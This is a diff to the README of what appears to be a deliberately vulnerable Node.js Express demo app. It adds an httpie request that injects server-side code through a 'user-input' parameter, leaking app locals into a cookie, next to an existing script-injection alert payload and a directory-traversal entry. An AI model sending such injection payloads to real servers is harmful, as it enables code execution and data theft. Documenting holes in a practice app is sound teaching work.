@@ -68,6 +68,12 @@ Injecting script onto user browser
 http GET http://localhost:8089/user-input userInput=="alert('You system is under our control now.')"
 ```
 
+Can exploit the whole server by injecting something like the code below (https://medium.com/lift-security/in-memory-backdoor-for-node-js-express-apps-2a3f4301925b)
+
+```bash
+http GET http://localhost:8089/user-input userInput=="res.cookie('appLocals',JSON.stringify(req.app.locals))"
+```
+
 ## Vulnerabilities
 
 - [x] [directory traversal](src/Controllers/ImageLookup.js#L9)
